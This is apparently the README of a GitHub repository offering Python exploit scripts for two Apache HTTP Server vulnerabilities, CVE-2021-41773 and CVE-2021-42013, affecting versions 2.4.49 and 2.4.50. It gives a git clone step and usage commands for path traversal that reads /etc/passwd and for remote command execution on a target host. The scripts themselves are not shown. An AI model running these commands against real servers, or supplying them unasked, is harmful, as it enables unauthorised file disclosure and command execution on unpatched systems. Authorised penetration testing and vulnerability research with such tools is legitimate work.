# Apache-CVEs
Exploit created in python3 to exploit known vulnerabilities in Apache web server (CVE-2021-41773, CVE-2021-42013)

## What's apache

The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services in sync with the current HTTP standards.

## Version Affected

- CVE-2021-41773 -> 2.4.49
- CVE-2021-42013 -> 2.4.50

# How to install

Just do a git clone:

```
git clone https://github.com/0xGabe/Apache-CVEs
```

# CVE-2021-41773

## How to use

### Path traversal

To read the desired file, just pass the file path, if the user does not have permission to read, there will be no reading result.

```
python3 cve-2021-41773.py --url http://HOST:PORT --path /etc/passwd
```

### Remote Command Execution

To execute commands with spaces, special characters or the like on the target machine, it is necessary to pass the command in quotes.

```
python3 cve-2021-41773.py --url http://HOST:PORT --cmd id
```

# CVE-2021-42013

## How to use

### Path traversal

To read the desired file, just pass the file path, if the user does not have permission to read, there will be no reading result.

```
python3 cve-2021-42013.py --url http://HOST:PORT --path /etc/passwd
```

### Remote Command Execution

To execute commands with spaces, special characters or the like on the target machine, it is necessary to pass the command in quotes.

```
python3 cve-2021-42013.py --url http://HOST:PORT --cmd id
```




